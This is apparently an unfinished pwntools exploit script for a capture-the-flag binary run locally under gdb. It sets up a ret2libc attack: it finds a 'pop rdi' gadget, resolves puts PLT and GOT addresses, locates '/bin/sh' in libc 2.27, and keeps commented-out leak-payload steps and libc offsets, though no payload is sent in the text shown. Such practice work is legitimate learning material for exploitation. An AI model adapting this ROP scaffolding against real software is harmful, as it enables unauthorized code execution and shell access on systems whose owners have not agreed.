#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
e = context.binary = ELF("./pwn")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
+"\nbreak *main"
+"\nc"
)

libc = ELF("./libc-2.27.so")
exe = ELF("./pwn")
rop = ROP(exe)
pop_rdi = rop.find_gadget(["pop rdi"])[0]
#0x400690 puts@plt
puts_plt = e.plt.puts
puts_got = e.got.puts
symbolsPuts= exe.symbols['puts']
#puts Offset 0x58e50
#system offset 0x28d70
#binsh offset 0x1b0679
# leakLibc += popRdi # Pop got entry for puts in rdi register
# leakLibc += gotPuts # GOT address of puts
# leakLibc += pltPuts
#p.send(payload)
binsh = next(libc.search(b"/bin/sh\x00"))
success(f"{hex(puts_plt)=}")
success(f"{hex(puts_got)=}")
success(f"{hex(symbolsPuts)=}")
success(f"{hex(binsh)=}")


p.interactive()